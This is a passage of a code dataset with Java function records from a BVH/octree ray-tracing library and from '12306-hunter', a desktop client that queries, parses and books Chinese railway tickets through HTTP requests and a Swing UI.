t_tmp=t0_x; t0_x=t1_x; t1_x=t_tmp; }\n    if( t0_y > t1_y) { t_tmp=t0_y; t0_y=t1_y; t1_y=t_tmp; }\n    if( t0_z > t1_z) { t_tmp=t0_z; t0_z=t1_z; t1_z=t_tmp; }\n\n    // get the max component of t0_xyz\n    if( t0_x > t0_y){\n      if( t0_x > t0_z) tn=t0_x; else tn=t0_z;\n    } else {\n      if( t0_y > t0_z) tn=t0_y; else tn=t0_z;\n    }\n    \n    // get the min component of t1_xyz\n    if( t1_x < t1_y){\n      if( t1_x < t1_z) tf=t1_x; else tf=t1_z;\n    } else {\n      if( t1_y < t1_z) tf=t1_y; else tf=t1_z;\n    }\n \n    return (tn<=tf) ? tn : Float.MAX_VALUE;\n  }", "path": "SpacePartitioning\\src\\DwIntersectionTests\\Intersect_RAY_AABB.java", "repo_name": "diwi/Space_Partitioning_Octree_BVH", "stars": 75, "license": "None", "language": "java", "size": 3279}
{"docstring": "//----------------------------------------------------------------------------\n// TRAVERSE - SHADOW_TEST - stack sorted\n//----------------------------------------------------------------------------\n", "func_signal": "public void shadowTest_stackSorted(BvhHitResult hit_result)", "code": "{\n  if( hit_result == null )\n    return;\n  \n  float tn = Intersect_RAY_AABB.intersectNear(hit_result.ray, bvh.root._getAABB());\n  if( tn >= hit_result.t) \n    return;\n  \n  int stack_ptr  = -1;\n  insertSorted(stack, ++stack_ptr, bvh.root, tn);\n\n  // TODO: description\n  while(stack_ptr>=0){\n\n    BvhTraversalData cur = stack[stack_ptr--];\n\n//      hit_result.COUNT_node_traversal_steps++;\n//      hit_result.traversal_history.add(cur);\n   \n    if( cur.node._isLeaf() ){\n      if( intersectRayObjects(cur.node, hit_result) ) return;\n      continue;\n    }\n    \n    BvhNode A = cur.node._childA(bvh);\n    BvhNode B = cur.node._childB(bvh);\n \n    float ta = Intersect_RAY_AABB.intersectNear(hit_result.ray, A._getAABB());\n    float tb = Intersect_RAY_AABB.intersectNear(hit_result.ray, B._getAABB());\n    \n    if( ta > tb ) {\n      if( ta < hit_result.t ) insertSorted(stack, ++stack_ptr, A, ta); \n      if( tb < hit_result.t ) insertSorted(stack, ++stack_ptr, B, tb); \n    } else {\n      if( tb < hit_result.t ) insertSorted(stack, ++stack_ptr, B, tb); \n      if( ta < hit_result.t ) insertSorted(stack, ++stack_ptr, A, ta); \n    }\n  }\n}", "path": "SpacePartitioning\\src\\DwBVH\\BvhTraversal.java", "repo_name": "diwi/Space_Partitioning_Octree_BVH", "stars": 75, "license": "None", "language": "java", "size": 3279}
{"docstring": "/**\n *\n * @param fovy   (float) field of view, y (degrees)\n * @param aspect (float) ratio (width/height)\n * @param n      (float) near\n * @param f      (float) far\n * @param dst_m4 (mat4) output matrix\n */\n", "func_signal": "public static void perspective_ref(float fovy, float aspect, float n, float f, float[] dst_m4)", "code": "{\n//  float cot = (float) (1.0f/Math.tan(fovy*Math.PI/360));\n  float cot = (float) (Math.tan((180 - fovy)*Math.PI/360f));\n  float nf = (n - f);\n\n  dst_m4[0] = cot/aspect;  dst_m4[4] = 0;     dst_m4[ 8] = 0;             dst_m4[12] = 0;\n  dst_m4[1] = 0;           dst_m4[5] = cot;   dst_m4[ 9] = 0;             dst_m4[13] = 0;\n  dst_m4[2] = 0;           dst_m4[6] = 0;     dst_m4[10] = (n+f) / nf;    dst_m4[14] = (2*n*f) / nf;\n  dst_m4[3] = 0;           dst_m4[7] = 0;     dst_m4[11] = -1;            dst_m4[15] = 0;\n\n\n\n//    var t = n*Math.tan(fovy/2);\n//    var r = t*aspect;\n//\n//    dst_m4[0] = n/r;  dst_m4[4] = 0;     dst_m4[ 8] = 0;             dst_m4[12] = 0;\n//    dst_m4[1] = 0;    dst_m4[5] = n/t;   dst_m4[ 9] = 0;             dst_m4[13] = 0;\n//    dst_m4[2] = 0;    dst_m4[6] = 0;     dst_m4[10] = (n+f) / nf;    dst_m4[14] = (2*n*f) / nf;\n//    dst_m4[3] = 0;    dst_m4[7] = 0;     dst_m4[11] = -1;            dst_m4[15] = 0;\n}", "path": "SpacePartitioning\\src\\DwMath\\DwMat4.java", "repo_name": "diwi/Space_Partitioning_Octree_BVH", "stars": 75, "license": "None", "language": "java", "size": 3279}
{"docstring": "//  public boolean checkIfCloser(float t_new, int item_idx, BvhNode node, float hit_backface, float u, float v){\n//    if( t_min < t_new && t_new < t){\n//      this.t            = t_new;\n//      this.u            = u;\n//      this.v            = v;\n//      this.item_idx     = item_idx;\n//      this.node         = node;\n//      this.hit_backface = hit_backface;\n//      this.got_hit      = true;\n//      return true;\n//    }\n//    return false;\n//  }\n", "func_signal": "public boolean checkIfCloser(float[] tuv, int item_idx, BvhNode node, float hit_backface)", "code": "{\n    if( t_min < tuv[0] && tuv[0] < t){\n      this.t            = tuv[0];\n      this.u            = tuv[1];\n      this.v            = tuv[2];\n      this.item_idx     = item_idx;\n      this.node         = node;\n      this.hit_backface = hit_backface;\n      this.got_hit      = true;\n      return true;\n    }\n    return false;\n  }", "path": "SpacePartitioning\\src\\DwBVH\\BvhHitResult.java", "repo_name": "diwi/Space_Partitioning_Octree_BVH", "stars": 75, "license": "None", "language": "java", "size": 3279}
{"docstring": "//  V - 2.0f * dot(V,N) * N;\n", "func_signal": "public static float[] reflect_new(float[] V, float[] N)", "code": "{\n    float c = 2f*dot(V, N);\n    return new float[]{  V[0]-c*N[0], \n                         V[1]-c*N[1], \n                         V[2]-c*N[2]   };\n  }", "path": "SpacePartitioning\\src\\DwMath\\DwVec3.java", "repo_name": "diwi/Space_Partitioning_Octree_BVH", "stars": 75, "license": "None", "language": "java", "size": 3279}
{"docstring": "/**\n * \u8fc7\u6ee4\u6389\u672a\u52fe\u9009\u7684\u4e58\u8f66\u4eba\u8bb0\u5f55\n * @return\n */\n", "func_signal": "public List<PassengerData> getValidPassengerDatas()", "code": "{\n\tList<PassengerData> validPassengerDatas = new ArrayList<PassengerData>();\n\tfor (PassengerData passengerData : passengerDatas) {\n\t\tif (passengerData.isSelected()) {\n\t\t\tvalidPassengerDatas.add(passengerData);\n\t\t}\n\t}\n\treturn validPassengerDatas;\n}", "path": "src\\main\\java\\lab\\ticket\\model\\TicketData.java", "repo_name": "xautlx/12306-hunter", "stars": 96, "license": "None", "language": "java", "size": 2348}
{"docstring": "/**\n * \u5224\u65ad\u662f\u5426\u662f\u8d77\u59cb\u6216\u8005\u7ec8\u70b9\u7ad9 \u5982\u679c\u4e0d\u662f\u8d77\u59cb\u6216\u7ec8\u70b9\u6ca1\u6709<img src='/otsweb/images/tips/first.gif'>\u6216<img\n * src='/otsweb/images/tips/last.gif'>\n * \n * @return String\n */\n", "func_signal": "private static String isStartOrEndStation(String startOrEnd)", "code": "{\n\tif (startOrEnd.contains(\"\\'>\")) {\n\t\tstartOrEnd = startOrEnd.substring(startOrEnd.lastIndexOf(\"\\'>\") + 2, startOrEnd.length());\n\t}\n\treturn startOrEnd;\n}", "path": "src\\main\\java\\lab\\ticket\\util\\TicketUtil.java", "repo_name": "xautlx/12306-hunter", "stars": 96, "license": "None", "language": "java", "size": 2348}
{"docstring": "/**\n * Launch the application.\n */\n", "func_signal": "public static void main(String[] args)", "code": "{\n\ttry {\n\t\tRandomCodeDialog dialog = new RandomCodeDialog();\n\t\tdialog.setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);\n\t\tdialog.setVisible(true);\n\t} catch (Exception e) {\n\t\te.printStackTrace();\n\t}\n}", "path": "src\\main\\java\\lab\\ticket\\view\\RandomCodeDialog.java", "repo_name": "xautlx/12306-hunter", "stars": 96, "license": "None", "language": "java", "size": 2348}
{"docstring": "/**\n * \u83b7\u53d6\u9884\u5b9a\u6309\u94ae\u4e2d\u7684\u76f8\u5173\u53c2\u6570\n * \n * @param mmString\n * @return String[]\n */\n", "func_signal": "private static String[] getMMString(String mmString)", "code": "{\n\tString[] mString = new String[20];\n\tif (mmString.contains(\"class=\\'btn130_2\\'\")) {\n\t\tString regex = \"getSelected(\\'\";\n\t\tmString = mmString.substring(mmString.indexOf(\"regex\") + regex.length(), mmString.indexOf(\"\\')\"))\n\t\t\t\t.split(\"#\");\n\t}\n\treturn mString;\n}", "path": "src\\main\\java\\lab\\ticket\\util\\TicketUtil.java", "repo_name": "xautlx/12306-hunter", "stars": 96, "license": "None", "language": "java", "size": 2348}
{"docstring": "/**\n * \u8fd4\u56dePOST\u8bf7\u6c42\u54cd\u5e94\u5b57\u7b26\u4e32\n * @param httpClient\n * @param url\n * @param parameters\n * @param cookieData\n * @return\n */\n", "func_signal": "private String postHttpRequestAsString(HttpClient httpClient, String url, List<NameValuePair> parameters,\n\t\tMap<String, String> cookieData)", "code": "{\n\ttry {\n\t\tHttpResponse response = postHttpRequest(httpClient, url, parameters, cookieData);\n\t\tHttpEntity entity = response.getEntity();\n\t\tString responseHTML = EntityUtils.toString(entity).trim();\n\t\tTicketMainFrame.appendMessage(\"GET: \" + url);\n\t\tString message = null;\n\t\tif (responseHTML.length() > 300) {\n\t\t\tmessage = \" + Response HTML(0-300):\\n\" + responseHTML.substring(0, 100);\n\t\t} else {\n\t\t\tmessage = \" + Response HTML:\\n\" + responseHTML;\n\t\t}\n\t\tTicketMainFrame.appendMessage(message);\n\t\tlogger.debug(\" + Response HTML (ALL):\\n\" + responseHTML);\n\t\treturn responseHTML;\n\t} catch (Exception e) {\n\t\tthrow new IllegalStateException(e);\n\t}\n}", "path": "src\\main\\java\\lab\\ticket\\service\\HttpClientService.java", "repo_name": "xautlx/12306-hunter", "stars": 96, "license": "None", "language": "java", "size": 2348}
{"docstring": "/**\n * \u68c0\u67e5\u7ed9\u5b9a\u7684\u8f66\u6b21\u5ea7\u4f4d\u7c7b\u578b\u662f\u5426\u6709\u6548\n * @param trainData\n * @return\n */\n", "func_signal": "public boolean validateTrainData(TrainData trainData)", "code": "{\n\tif (!trainData.getTrainNo().equalsIgnoreCase(this.trainNo)) {\n\t\treturn false;\n\t}\n\tString st = seatDatas.get(trainData.getSeatType());\n\tif (StringUtils.isBlank(st) || st.equals(TicketUtil.INVALID_SEAT_TYPE)) {\n\t\treturn false;\n\t}\n\treturn true;\n}", "path": "src\\main\\java\\lab\\ticket\\model\\TrainQueryInfo.java", "repo_name": "xautlx/12306-hunter", "stars": 96, "license": "None", "language": "java", "size": 2348}
{"docstring": "/**\n * Launch the application.\n */\n", "func_signal": "public static void main(String[] args)", "code": "{\n\tEventQueue.invokeLater(new Runnable() {\n\t\tpublic void run() {\n\t\t\ttry {\n\t\t\t\tframe = new TicketMainFrame();\n\t\t\t\tframe.setVisible(true);\n\t\t\t} catch (Exception e) {\n\t\t\t\te.printStackTrace();\n\t\t\t}\n\t\t}\n\t});\n}", "path": "src\\main\\java\\lab\\ticket\\TicketMainFrame.java", "repo_name": "xautlx/12306-hunter", "stars": 96, "license": "None", "language": "java", "size": 2348}
{"docstring": "/**\n * \u67e5\u8be2\u8fd4\u56de\u5b57\u7b26\u5bf9\u8c61\u5316\n * \n * @param response\n * @return List<TrainQueryInfo>\n */\n", "func_signal": "public static List<TrainQueryInfo> parserQueryInfo(String response)", "code": "{\n\tList<TrainQueryInfo> tqis = new ArrayList<TrainQueryInfo>();\n\tresponse = response.replaceAll(\"&nbsp;\", \"\");\n\tlogger.info(\"Response String is \" + response);\n\t// Session \u8fc7\u671f\n\tif (\"-10\".equals(response)) {\n\t\tlogger.info(\"Session is timeout!\");\n\t\treturn tqis;\n\t}\n\tString[] number = response.split(\"\\\\\\\\n\");\n\tfor (int i = 0; i < number.length; i++) {\n\t\tString info = number[i];\n\t\tif (StringUtils.isNotBlank(info)) {\n\t\t\tString[] ticketInfo = info.split(\",\");\n\t\t\tTrainQueryInfo trainQueryInfo = new TrainQueryInfo();\n\t\t\ttrainQueryInfo.setTrainCode(ticketInfo[0]);\n\t\t\ttrainQueryInfo.setTrainNo(ticketInfo[1].substring(ticketInfo[1].lastIndexOf(\"\\'>\") + 2,\n\t\t\t\t\tticketInfo[1].lastIndexOf(\"</span>\")));\n\t\t\tString startstation = isStartOrEndStation(ticketInfo[2]);\n\t\t\ttrainQueryInfo.setFromStation(startstation.substring(0, startstation.lastIndexOf(\"<br>\")));\n\t\t\ttrainQueryInfo.setFromStationName(convertStation(trainQueryInfo.getFromStation()));\n\t\t\ttrainQueryInfo.setFromStationCode(TicketUtil.getCityCode(startstation.substring(0,\n\t\t\t\t\tstartstation.lastIndexOf(\"<br>\"))));\n\t\t\ttrainQueryInfo.setStartTime(startstation.substring(startstation.lastIndexOf(\"<br>\") + 4,\n\t\t\t\t\tstartstation.length()));\n\t\t\tString endstation = isStartOrEndStation(ticketInfo[3]);\n\t\t\ttrainQueryInfo.setToStation(endstation.substring(0, endstation.lastIndexOf(\"<br>\")));\n\t\t\ttrainQueryInfo.setToStationName(convertStation(trainQueryInfo.getToStation()));\n\t\t\ttrainQueryInfo.setToStationCode(TicketUtil.getCityCode(endstation.substring(0,\n\t\t\t\t\tendstation.lastIndexOf(\"<br>\"))));\n\t\t\ttrainQueryInfo\n\t\t\t\t\t.setEndTime(endstation.substring(endstation.lastIndexOf(\"<br>\") + 4, endstation.length()));\n\t\t\ttrainQueryInfo.setTakeTime(ticketInfo[4]);\n\n\t\t\tMap<SeatType, String> seatDatas = trainQueryInfo.getSeatDatas();\n\t\t\tseatDatas.put(SeatType.BUSS_SEAT, isExistTicket(ticketInfo[5]));\n\t\t\tseatDatas.put(SeatType.BEST_SEAT, isExistTicket(ticketInfo[6]));\n\t\t\tseatDatas.put(SeatType.ONE_SEAT, isExistTicket(ticketInfo[7]));\n\t\t\tseatDatas.put(SeatType.TWO_SEAT, isExistTicket(ticketInfo[8]));\n\t\t\tseatDatas.put(SeatType.VAG_SLEEPER, isExistTicket(ticketInfo[9]));\n\t\t\tseatDatas.put(SeatType.SOFT_SLEEPER, isExistTicket(ticketInfo[10]));\n\t\t\tseatDatas.put(SeatType.HARD_SLEEPER, isExistTicket(ticketInfo[11]));\n\t\t\tseatDatas.put(SeatType.SOFT_SEAT, isExistTicket(ticketInfo[12]));\n\t\t\tseatDatas.put(SeatType.HARD_SEAT, isExistTicket(ticketInfo[13]));\n\t\t\tseatDatas.put(SeatType.NONE_SEAT, isExistTicket(ticketInfo[14]));\n\t\t\tseatDatas.put(SeatType.OTH_SEAT, isExistTicket(ticketInfo[15]));\n\n\t\t\tString infos = ticketInfo[16];\n\t\t\tString[] trainInfo = getMMString(infos);\n\t\t\tif (trainInfo.length > 0) {\n\t\t\t\ttrainQueryInfo.setMmStr(trainInfo[12]);\n\t\t\t\ttrainQueryInfo.setTrainno4(trainInfo[3]);\n\t\t\t\ttrainQueryInfo.setYpInfoDetail(trainInfo[11]);\n\t\t\t\ttrainQueryInfo.setFormStationNo(trainInfo[9]);\n\t\t\t\ttrainQueryInfo.setToStationNo(trainInfo[10]);\n\t\t\t\ttrainQueryInfo.setLocationCode(trainInfo[13]);\n\t\t\t}\n\n\t\t\t// --\uff1a\u6ca1\u6709\u8be5\u5e2d\u522b\uff1b*\uff1a\u672a\u5230\u5f00\u59cb\u65f6\u95f4\uff1b\u6709\uff1a\u6709\u5e76\u4e14\u6570\u91cf\u5145\u8db3\uff1b\u6570\u5b57\uff1a\u6709\u4f46\u6570\u91cf\u6709\u9650\uff1a\u65e0\uff1a\u5df2\u552e\u5b8c\n\t\t\tboolean validForPurchase = false;\n\t\t\tfor (Map.Entry<SeatType, String> me : seatDatas.entrySet()) {\n\t\t\t\tString value = me.getValue();\n\t\t\t\tif (value.equals(\"--\") || value.equals(\"\u65e0\") || value.equals(\"*\")) {\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\tvalidForPurchase = true;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\ttrainQueryInfo.setValidForPurchase(validForPurchase);\n\n\t\t\ttqis.add(trainQueryInfo);\n\t\t}\n\t}\n\treturn tqis;\n}", "path": "src\\main\\java\\lab\\ticket\\util\\TicketUtil.java", "repo_name": "xautlx/12306-hunter", "stars": 96, "license": "None", "language": "java", "size": 2348}
{"docstring": "/**\n * \u57fa\u4e8e\u767b\u5f55\u7528\u6237Cookie\u6570\u636e\u6784\u5efa\u4e0b\u5355\u9a8c\u8bc1\u7801\u56fe\u7247\n * @param cookieData\n * @return\n */\n", "func_signal": "public File buildSubmitCodeImage(Map<String, String> cookieData)", "code": "{\n\tHttpClient httpClient = buildHttpClient();\n\tFile file = new File(System.getProperty(\"java.io.tmpdir\") + File.separator + cookieData.get(\"JSESSIONID\")\n\t\t\t+ \".submit.jpg\");\n\ttry {\n\t\tString url = \"https://dynamic.12306.cn/otsweb/passCodeNewAction.do?module=passenger&rand=randp\";\n\t\tHttpResponse response = getHttpRequest(httpClient, url, null, cookieData);\n\t\tHttpEntity entity = response.getEntity();\n\t\tInputStream instream = entity.getContent();\n\t\tOutputStream out = new FileOutputStream(file);\n\t\tbyte[] tmp = new byte[1];\n\t\twhile ((instream.read(tmp)) != -1) {\n\t\t\tout.write(tmp);\n\t\t}\n\t\tout.close();\n\t\tinstream.close();\n\t\tTicketMainFrame.appendMessage(\"\u66f4\u65b0\u4e0b\u5355\u9a8c\u8bc1\u7801\u56fe\u50cf:\" + file.getAbsolutePath());\n\t\treturn file;\n\t} catch (Exception e) {\n\t\tthrow new IllegalStateException(e);\n\t} finally {\n\t\thttpClient.getConnectionManager().shutdown();\n\t}\n}", "path": "src\\main\\java\\lab\\ticket\\service\\HttpClientService.java", "repo_name": "xautlx/12306-hunter", "stars": 96, "license": "None", "language": "java", "size": 2348}
{"docstring": "/**\n * POST\u8bf7\u6c42\n * @param httpclient\n * @param url\n * @param parameters\n * @param cookieData\n * @return\n */\n", "func_signal": "private HttpResponse postHttpRequest(HttpClient httpclient, String url, List<NameValuePair> parameters,\n\t\tMap<String, String> cookieData)", "code": "{\n\ttry {\n\t\tlogger.debug(\"------------------------------------------------------------------------\");\n\t\tlogger.debug(\"POST URL: \" + url);\n\n\t\tHttpPost post = new HttpPost(url);\n\t\tpost.setHeader(\"User-Agent\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ZHCN)\");\n\t\tif (cookieData != null) {\n\t\t\tboolean first = true;\n\t\t\tStringBuilder cookie = new StringBuilder();\n\t\t\tfor (Map.Entry<String, String> me : cookieData.entrySet()) {\n\t\t\t\tif (first) {\n\t\t\t\t\tfirst = false;\n\t\t\t\t} else {\n\t\t\t\t\tcookie.append(\";\");\n\t\t\t\t}\n\t\t\t\tcookie.append(me.getKey() + \"=\" + me.getValue());\n\t\t\t}\n\t\t\tpost.setHeader(\"Cookie\", cookie.toString());\n\t\t}\n\t\tif (parameters != null) {\n\t\t\tUrlEncodedFormEntity uef = new UrlEncodedFormEntity(parameters, HTTP.UTF_8);\n\t\t\tpost.setEntity(uef);\n\t\t}\n\t\tif (logger.isDebugEnabled()) {\n\t\t\tif (parameters != null) {\n\t\t\t\tlogger.debug(\" + Request parameters: \");\n\n\t\t\t\tfor (NameValuePair param : parameters) {\n\t\t\t\t\tlogger.debug(\"   - \" + param.getName() + \" : \" + param.getValue());\n\t\t\t\t}\n\t\t\t}\n\t\t\tlogger.debug(\" + Request headers: \");\n\t\t\tfor (Header header : post.getAllHeaders()) {\n\t\t\t\tlogger.debug(\"   - \" + header.getName() + \" : \" + header.getValue());\n\t\t\t}\n\t\t}\n\t\tHttpResponse response = httpclient.execute(post);\n\t\tif (logger.isDebugEnabled()) {\n\t\t\tlogger.debug(\" + Response headers: \");\n\t\t\tfor (Header header : response.getAllHeaders()) {\n\t\t\t\tlogger.debug(\"   - \" + header.getName() + \" : \" + header.getValue());\n\t\t\t}\n\t\t}\n\t\tlogger.debug(\"***********************************************************************\");\n\t\treturn response;\n\t} catch (Exception e) {\n\t\tthrow new IllegalStateException(e);\n\t}\n}", "path": "src\\main\\java\\lab\\ticket\\service\\HttpClientService.java", "repo_name": "xautlx/12306-hunter", "stars": 96, "license": "None", "language": "java", "size": 2348}
{"docstring": "/**\n * \u662f\u5426\u5b58\u5728\u706b\u8f66\u7968\u4fe1\u606f \u706b\u8f66\u7968\u4fe1\u606f\u5b58\u5728\u4e0b\u9762\u51e0\u79cd\u60c5\u51b5\uff1a --\uff1a\u6ca1\u6709\u8be5\u5e2d\u522b\uff1b*\uff1a\u672a\u5230\u5f00\u59cb\u65f6\u95f4\uff1b\u6709\uff1a\u6709\u5e76\u4e14\u6570\u91cf\u5145\u8db3\uff1b\u6570\u5b57\uff1a\u6709\u4f46\u6570\u91cf\u6709\u9650\uff1a\u65e0\uff1a\u5df2\u552e\u5b8c\n * \n * @return String\n */\n", "func_signal": "private static String isExistTicket(String ticket)", "code": "{\n\tif (INVALID_SEAT_TYPE.equals(ticket)) {\n\t\treturn ticket;\n\t}\n\tif (!ticket.contains(\"\\'>\")) {\n\t\treturn ticket;\n\t}\n\tString ticketinfo = ticket.substring(ticket.lastIndexOf(\"\\'>\") + 2, ticket.lastIndexOf(\"</font>\"));\n\treturn ticketinfo;\n}", "path": "src\\main\\java\\lab\\ticket\\util\\TicketUtil.java", "repo_name": "xautlx/12306-hunter", "stars": 96, "license": "None", "language": "java", "size": 2348}
{"docstring": "/**\n * \u7ed1\u5b9a\u6a21\u578b\u5bf9\u8c61\u6570\u636e\u5230UI\n * @return\n */\n", "func_signal": "public void bindModeltoUI(PassengerData passengerData)", "code": "{\n\tlogger.debug(\"Binding Model data for passenger: {}\", passengerData.getCardNo());\n\tif (passengerData.isSelected()) {\n\t\tchckbxSelect.setSelected(true);\n\t} else {\n\t\tchckbxSelect.setSelected(false);\n\t\tcomboCardType.setEnabled(false);\n\t\ttextCardNo.setEnabled(false);\n\t\ttextMobile.setEnabled(false);\n\t\ttextName.setEnabled(false);\n\t\tcomboTicketType.setEnabled(false);\n\t}\n\ttextCardNo.setText(passengerData.getCardNo());\n\tcomboCardType.setSelectedItem(passengerData.getCardType());\n\ttextName.setText(passengerData.getName());\n\ttextMobile.setText(passengerData.getMobile());\n\tcomboTicketType.setSelectedItem(passengerData.getTicketType());\n}", "path": "src\\main\\java\\lab\\ticket\\view\\PassengerPanel.java", "repo_name": "xautlx/12306-hunter", "stars": 96, "license": "None", "language": "java", "size": 2348}
{"docstring": "/**\n * @param args\n */\n", "func_signal": "public static void main(String[] args)", "code": "{\n\tHttpClientService httpClientService = new HttpClientService();\n\t//httpClientService.initCookie();\n\n\tList<NameValuePair> parameters = new ArrayList<NameValuePair>();\n\tparameters.add(new BasicNameValuePair(GETQUEUECOUNT_FROM, \"BPX\"));\n\tparameters.add(new BasicNameValuePair(GETQUEUECOUNT_SEAT, \"4\"));\n\tparameters.add(new BasicNameValuePair(GETQUEUECOUNT_STATION, \"Z3\"));\n\tparameters.add(new BasicNameValuePair(GETQUEUECOUNT_TICKET, \"40484502902027450262\"));\n\tparameters.add(new BasicNameValuePair(GETQUEUECOUNT_TO, \"JBN\"));\n\tparameters.add(new BasicNameValuePair(GETQUEUECOUNT_TRAIN_DATE, \"2013-11-21\"));\n\tparameters.add(new BasicNameValuePair(GETQUEUECOUNT_TRAIN_NO, \"24000000Z306\"));\n\n\tMap<String, String> cookieData = new HashMap<String, String>();\n\tcookieData.put(\"JSESSIONID\", \"81BFCA3C5F2AE80241FD81E7AA23B410\");\n\tcookieData.put(\"BIGipServerotsweb\", \"2262040842.48160.0000\");\n\n\thttpClientService.getHttpRequestAsString(buildHttpClient(), GET_URL_GETQUEUECOUNT, parameters, cookieData);\n}", "path": "src\\main\\java\\lab\\ticket\\service\\HttpClientService.java", "repo_name": "xautlx/12306-hunter", "stars": 96, "license": "None", "language": "java", "size": 2348}
{"docstring": "/**\n * Create the panel.\n */\n", "func_signal": "public PassengerPanel()", "code": "{\n\tsetBorder(new TitledBorder(UIManager.getBorder(\"TitledBorder.border\"), \"\\u4E58\\u5BA2\", TitledBorder.LEADING,\n\t\t\tTitledBorder.TOP, null, null));\n\tGridBagLayout gridBagLayout = new GridBagLayout();\n\tgridBagLayout.columnWidths = new int[] { 286, 0 };\n\tgridBagLayout.rowHeights = new int[] { 47, 0 };\n\tgridBagLayout.columnWeights = new double[] { 1.0, Double.MIN_VALUE };\n\tgridBagLayout.rowWeights = new double[] { 0.0, Double.MIN_VALUE };\n\tsetLayout(gridBagLayout);\n\n\tpanel_2 = new JPanel();\n\tGridBagConstraints gbc_panel_2 = new GridBagConstraints();\n\tgbc_panel_2.fill = GridBagConstraints.BOTH;\n\tgbc_panel_2.gridx = 0;\n\tgbc_panel_2.gridy = 0;\n\tadd(panel_2, gbc_panel_2);\n\tGridBagLayout gbl_panel_2 = new GridBagLayout();\n\tgbl_panel_2.columnWidths = new int[] { 71, 0, 89, 150, 80, 100, 72, 0 };\n\tgbl_panel_2.rowHeights = new int[] { 0, 0, 0 };\n\tgbl_panel_2.columnWeights = new double[] { 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, Double.MIN_VALUE };\n\tgbl_panel_2.rowWeights = new double[] { 0.0, 0.0, Double.MIN_VALUE };\n\tpanel_2.setLayout(gbl_panel_2);\n\n\tlabel = new JLabel(\"\u9009\u62e9\");\n\tGridBagConstraints gbc_label = new GridBagConstraints();\n\tgbc_label.insets = new Insets(0, 0, 5, 5);\n\tgbc_label.gridx = 1;\n\tgbc_label.gridy = 0;\n\tpanel_2.add(label, gbc_label);\n\n\tlabel_8 = new JLabel(\"\u8bc1\u4ef6\u7c7b\u578b\");\n\tGridBagConstraints gbc_label_8 = new GridBagConstraints();\n\tgbc_label_8.insets = new Insets(0, 0, 5, 5);\n\tgbc_label_8.gridx = 2;\n\tgbc_label_8.gridy = 0;\n\tpanel_2.add(label_8, gbc_label_8);\n\n\tlabel_9 = new JLabel(\"\u8bc1\u4ef6\u53f7\u7801\");\n\tGridBagConstraints gbc_label_9 = new GridBagConstraints();\n\tgbc_label_9.fill = GridBagConstraints.HORIZONTAL;\n\tgbc_label_9.insets = new Insets(0, 0, 5, 5);\n\tgbc_label_9.gridx = 3;\n\tgbc_label_9.gridy = 0;\n\tpanel_2.add(label_9, gbc_label_9);\n\n\tlabel_7 = new JLabel(\"\u59d3\u540d\");\n\tGridBagConstraints gbc_label_7 = new GridBagConstraints();\n\tgbc_label_7.fill = GridBagConstraints.HORIZONTAL;\n\tgbc_label_7.insets = new Insets(0, 0, 5, 5);\n\tgbc_label_7.gridx = 4;\n\tgbc_label_7.gridy = 0;\n\tpanel_2.add(label_7, gbc_label_7);\n\n\tlabel_14 = new JLabel(\"\u624b\u673a\u53f7\");\n\tGridBagConstraints gbc_label_14 = new GridBagConstraints();\n\tgbc_label_14.insets = new Insets(0, 0, 5, 5);\n\tgbc_label_14.gridx = 5;\n\tgbc_label_14.gridy = 0;\n\tpanel_2.add(label_14, gbc_label_14);\n\n\tlabel_6 = new JLabel(\"\u7968\u79cd\");\n\tGridBagConstraints gbc_label_6 = new GridBagConstraints();\n\tgbc_label_6.insets = new Insets(0, 0, 5, 0);\n\tgbc_label_6.gridx = 6;\n\tgbc_label_6.gridy = 0;\n\tpanel_2.add(label_6, gbc_label_6);\n\n\tbtnLineOP = new JButton(\"+\");\n\tbtnLineOP.addActionListener(new ActionListener() {\n\t\tpublic void actionPerformed(ActionEvent e) {\n\t\t\tString op = btnLineOP.getText();\n\t\t\tif (\"-\".equals(op)) {\n\t\t\t\tcontainer.removePassengerPanel(self);\n\t\t\t} else {\n\t\t\t\tcontainer.addPassengerPanel();\n\t\t\t}\n\n\t\t}\n\t});\n\tGridBagConstraints gbc_btnLineOP = new GridBagConstraints();\n\tgbc_btnLineOP.insets = new Insets(0, 0, 0, 5);\n\tgbc_btnLineOP.gridx = 0;\n\tgbc_btnLineOP.gridy = 1;\n\tpanel_2.add(btnLineOP, gbc_btnLineOP);\n\n\tchckbxSelect = new JCheckBox(\"\");\n\tchckbxSelect.addActionListener(new ActionListener() {\n\t\tpublic void actionPerformed(ActionEvent e) {\n\t\t\tif (chckbxSelect.isSelected()) {\n\t\t\t\tcomboCardType.setEnabled(true);\n\t\t\t\ttextCardNo.setEnabled(true);\n\t\t\t\ttextMobile.setEnabled(true);\n\t\t\t\ttextName.setEnabled(true);\n\t\t\t\tcomboTicketType.setEnabled(true);\n\t\t\t} else {\n\t\t\t\tcomboCardType.setEnabled(false);\n\t\t\t\ttextCardNo.setEnabled(false);\n\t\t\t\ttextMobile.setEnabled(false);\n\t\t\t\ttextName.setEnabled(false);\n\t\t\t\tcomboTicketType.setEnabled(false);\n\t\t\t}\n\t\t}\n\t});\n\tchckbxSelect.setSelected(true);\n\tGridBagConstraints gbc_chckbxSelect = new GridBagConstraints();\n\tgbc_chckbxSelect.insets = new Insets(0, 0, 0, 5);\n\tgbc_chckbxSelect.gridx = 1;\n\tgbc_chckbxSelect.gridy = 1;\n\tpanel_2.add(chckbxSelect, gbc_chckbxSelect);\n\n\tcomboCardType = new JComboBox();\n\tcomboCardType.setModel(new DefaultComboBoxModel(CardType.values()));\n\tGridBagConstraints gbc_comboCardType = new GridBagConstraints();\n\tgbc_comboCardType.insets = new Insets(0, 0, 0, 5);\n\tgbc_comboCardType.gridx = 2;\n\tgbc_comboCardType.gridy = 1;\n\tpanel_2.add(comboCardType, gbc_comboCardType);\n\n\ttextCardNo = new JTextField();\n\tGridBagConstraints gbc_textCardNo = new GridBagConstraints();\n\tgbc_textCardNo.fill = GridBagConstraints.HORIZONTAL;\n\tgbc_textCardNo.insets = new Insets(0, 0, 0, 5);\n\tgbc_textCardNo.gridx = 3;\n\tgbc_textCardNo.gridy = 1;\n\tpanel_2.add(textCardNo, gbc_textCardNo);\n\ttextCardNo.setColumns(10);\n\n\ttextName = new JTextField();\n\tGridBagConstraints gbc_textName = new 